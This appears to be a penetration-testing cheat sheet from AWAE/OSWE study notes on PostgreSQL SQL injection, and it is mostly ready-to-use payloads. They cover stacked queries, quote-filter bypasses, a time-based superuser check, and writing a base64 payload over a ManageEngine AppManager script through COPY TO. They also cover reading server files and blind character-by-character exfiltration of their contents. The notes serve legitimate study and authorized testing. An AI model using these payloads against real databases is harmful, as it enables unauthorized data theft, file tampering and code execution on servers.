# PostgreSQL

### Notes

- String manipulation functions: https://www.postgresql.org/docs/14/functions-string.html
- Postgres SQL-injection attacks allow an attacker to perform **stacked queries**. This means that we can use a query terminator character in our payload (;), and inject a completely new query into the original vulnerable query string. This makes exploitation much easier since neither the injection point nor the payload are limited by the nature of the vulnerable query.

### Checklist

- [x] Check if user is DBA: `SELECT current_setting('is_superuser'); //'on' or 'off'`

### Quoted String Bypass

**Piping**

You can select individual characters using their code points (numbers that represent characters) and concatenate them together using the double pipe (||) operator.

> Note: This does not work for all SQL statements. See below for further bypasses.

```
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
 ?column?
----------
 AWAE
(1 row)
```

**Dollar-quoted String Constants**

[Lexical Structure](https://www.postgresql.org/docs/14/sql-syntax-lexical.html) in PostgreSQL allows other methods to represent strings. One is support for dollar-quoted string constants. Two dollar characters ($$) can be used as a quote (') substitute by themselves, or a single one ($) can indicate the beginning of a "tag". The tag is optional, can contain zero or more characters, and is terminated with a matching dollar ($). If used, this tag is then required at the end of the string as well:

```
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;

CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;

COPY 1

Query returned successfully in 201 msec.
```

### Time-based Injection

Check if executing as DBA:
```
SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
```

### Write to a File

```
COPY (select $$awae$$) to <file_name>
COPY (select $$awae$$) to $$C:\pwnd.txt$$
```
> Postgres COPY TO function does not support newline control characters in a single SELECT statement.
> Use a base64 encoded, then URL encoded string to reliably write file contents. If the URL query string will exceed the max URL length (2048 characters), try convert method to POST.

Example:

```
copy (select convert_from(decode($$B64_URL_ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
```

1. We need to use base64 encoding to avoid any issues with restricted characters within the COPY TO function.
2. We also need to URL encode the payload so that nothing gets mangled by the web server itself.
3. Finally, we need to use the `convert_from` function to convert the output of the decode function to a human-readable format to be stored in the destination file.

### Read a File

```
DROP TABLE IF EXISTS awae;
CREATE temp table awae (content text);
COPY awae FROM $$c:\awae.txt$$;
SELECT content FROM awae;
DROP TABLE awae;
```

**Exfiltrating data (Blind)**

```
create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+
```
